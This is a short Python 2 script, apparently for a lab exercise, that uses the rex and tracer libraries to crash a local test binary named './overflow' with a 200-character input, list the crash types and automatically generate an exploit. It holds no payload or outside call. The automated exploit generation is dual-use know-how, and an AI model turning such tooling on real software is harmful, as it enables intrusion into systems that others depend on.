import rex
import tracer
#t = tracer.Tracer('./overflow', 'a'*200)
#p, st = t.run()

crash = rex.Crash('./overflow', 'a'*200)
print crash.crash_types

print crash.exploit() 
